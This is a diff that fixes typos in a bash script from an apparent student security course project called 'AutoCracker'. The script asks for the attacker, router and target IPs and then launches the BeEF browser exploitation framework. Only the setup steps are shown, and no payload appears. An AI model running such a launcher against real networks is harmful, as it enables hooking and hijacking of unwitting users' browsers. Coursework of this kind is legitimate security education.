@@ -9,7 +9,7 @@ echo "000000000\/000000000000000000000000\/00000000000\/00000\/00000\/0000000\/0
 echo "CS378 AutoCracker - Browser Hook and CSRFF Final Project"
 echo "By Dillon Cuthrell, Anthony Nguyen, Midora DuBose"
 
-echo "Enter you IP here"
+echo "Enter your IP here"
 read yours
 echo "Enter your router's IP here"
 read router
@@ -21,7 +21,7 @@ then
 echo "Your IP is $yours, Router is $router, Target is $target"
 
 
-echo "Staring BeEF ... "
+echo "Starting BeEF ... "
 cd /usr/share/beef-xss
 ./beef > /root/Desktop/boutput.txt
 #BeEf output in boutput.txt
